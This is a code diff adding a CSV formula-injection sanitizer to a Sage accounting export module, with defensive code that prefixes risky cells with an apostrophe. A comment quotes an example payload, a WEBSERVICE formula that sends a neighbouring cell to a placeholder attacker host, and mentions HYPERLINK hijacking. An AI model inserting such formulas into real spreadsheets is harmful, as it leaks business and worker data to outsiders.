@@ -379,6 +379,22 @@ export async function exportCostCodeStructure(companyId: string): Promise<SageEx
   }
 }
 
+// CSV formula-injection triggers (OWASP): Excel, LibreOffice Calc, and
+// Sage 300 CRE's CSV import all evaluate a cell beginning with any of
+// these as a formula. A worker name, COR title, or cost-code description
+// of `=WEBSERVICE("https://attacker/"&A2)` exfiltrates the sibling row;
+// `=HYPERLINK(...)` can hijack the office user's click. Numeric strings
+// ("-100.00" etc.) pass through so negative amounts stay numbers.
+const CSV_FORMULA_TRIGGER = /^[=+\-@\t\r]/
+const NUMERIC_STRING = /^-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?$/
+export function sanitizeCsvCell(val: string | number | null | undefined): string | number {
+  if (val == null) return ''
+  if (typeof val !== 'string') return val
+  if (NUMERIC_STRING.test(val)) return val
+  if (CSV_FORMULA_TRIGGER.test(val)) return `'${val}`
+  return val
+}
+
 /**
  * Convert rows (array of flat objects) to a Sage-compatible CSV string.
  * Uses comma delimiter with double-quote text qualifiers.
@@ -387,12 +403,12 @@ export async function exportCostCodeStructure(companyId: string): Promise<SageEx
 export function toSageCSV(rows: SageRow[]): string {
   if (!rows.length) return ''
   const headers = Object.keys(rows[0])
-  const headerLine = headers.map(h => `"${h}"`).join(',')
+  const headerLine = headers.map(h => `"${sanitizeCsvCell(h)}"`).join(',')
   const dataLines = rows.map(row =>
     headers.map(key => {
       const val = row[key]
       if (val == null) return '""'
-      const str = String(val)
+      const str = String(sanitizeCsvCell(val))
       return `"${str.replace(/"/g, '""')}"`
     }).join(',')
   )
